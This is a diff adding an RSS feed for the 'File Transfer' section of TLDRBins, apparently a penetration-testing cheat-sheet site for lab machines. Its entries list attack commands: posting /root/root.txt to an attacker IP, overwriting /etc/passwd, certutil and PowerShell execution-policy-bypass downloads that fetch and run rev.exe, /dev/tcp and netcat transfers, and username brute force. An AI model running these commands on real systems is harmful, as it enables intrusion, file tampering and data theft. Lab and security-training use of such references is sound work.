@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>File Transfer on TLDRBins</title>
+    <link>https://tldrbins.github.io/@file-transfer/</link>
+    <description>Recent content in File Transfer on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@file-transfer/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Advance wget</title>
+      <link>https://tldrbins.github.io/advance_wget/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_wget/</guid>
+      <description> Advance wget # Provide a file with urls wget --input-file /root/root.txt # POST a file wget --post-file /root/root.txt http://10.10.14.10 # Overwrite a file wget http://10.10.14.10/passwd.txt -O /etc/passwd </description>
+    </item>
+    <item>
+      <title>Connection from Public Internet</title>
+      <link>https://tldrbins.github.io/connection_from_public_internet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
+      <description>Simply catch HTTP request webhook.site&#xA;Catch HTTP request and host a web server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+    </item>
+    <item>
+      <title>Curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://example.com/cmd.php # PUT a file curl -X PUT http://example.com/example.txt -d @example.txt # PUT a file (with creds) curl -X PUT http://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@example.com/example.txt -d @example.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://example.com/example.txt --data-binary @example.</description>
+    </item>
+    <item>
+      <title>File Transfer (Linux To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
+      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # In target Linux machine wget &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; # In target Linux machine curl &amp;lt;LOCAL_IP&amp;gt;/&amp;lt;FILE&amp;gt; -o &amp;lt;REMOTE_DEST_PATH&amp;gt; nc # In our local Linux machine nc -lvnp 4444 &amp;lt; &amp;lt;FILE&amp;gt; # In target Linux machine nc -w3 &amp;lt;LOCAL_IP&amp;gt; 4444 &amp;gt; &amp;lt;FILE&amp;gt; scp Remote to Local # If you have target password scp &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; Local to Remote # If you have target password scp &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; # If you have a ssh key scp -i id_rsa &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; pipe Local to Remote # In our local Linux machine cat &amp;lt;FILE&amp;gt; | nc -lnvp 4444 # In target Linux machine exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/4444 # Ctrl+C to interrupt after some time cat &amp;lt;&amp;amp;3 &amp;gt; &amp;lt;FILE&amp;gt; # Check md5sum &amp;lt;FILE&amp;gt; Base64 Encoding (for small binary) # Base64 encode binary cat &amp;lt;FILE&amp;gt; | base64 -w0 # Copy and paste the base64 encoded binary echo -n &amp;#39;&amp;lt;BASE64_FILE&amp;gt;&amp;#39; | base64 -d &amp;gt; &amp;lt;FILE&amp;gt; Note: For restricted environment</description>
+    </item>
+    <item>
+      <title>File Transfer (Linux to Windows)</title>
+      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
+      <description>HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: curl is not always available</description>
+    </item>
+    <item>
+      <title>File Transfer (Windows To Linux)</title>
+      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
+      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
+    </item>
+    <item>
+      <title>Finger Protocol</title>
+      <link>https://tldrbins.github.io/finger/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/finger/</guid>
+      <description> Basic # Check logged in users finger @10.10.11.10 # Check valid user finger &amp;lt;USER&amp;gt;@10.10.11.10 Brute force usernames finger-user-enum&#xA;perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.11.10 </description>
+    </item>
+    <item>
+      <title>FTP</title>
+      <link>https://tldrbins.github.io/ftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ftp/</guid>
+      <description>Config Location /etc/vsftpd.conf Basic # Connect ftp 10.10.11.10 +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # List ls # Switch to binary transfer mode bin # Download get &amp;lt;FILE&amp;gt; # Upload put &amp;lt;FILE&amp;gt; # Connect over tunnel passive # Exit quit Recusive download # anonymous login wget -r ftp://anonymous:@10.10.11.10 # with creds wget --user &amp;lt;USER&amp;gt; --password &amp;lt;PASSWORD&amp;gt; -m ftp://10.10.11.10 Note: Always check what&amp;rsquo;s in there first</description>
+    </item>
+    <item>
+      <title>Host a SMB Server</title>
+      <link>https://tldrbins.github.io/smb_server/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smb_server/</guid>
+      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username &amp;lt;USER&amp;gt; -password &amp;lt;PASSWORD&amp;gt; Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
+    </item>
+    <item>
+      <title>TFTP</title>
+      <link>https://tldrbins.github.io/tftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/tftp/</guid>
+      <description>TFTP # Connect tftp &amp;lt;TARGET&amp;gt; # Download get &amp;lt;FILE&amp;gt; # Exit quit Note: You need to know the exact filename, there is no directory listing in tftp</description>
+    </item>
+  </channel>
+</rss>
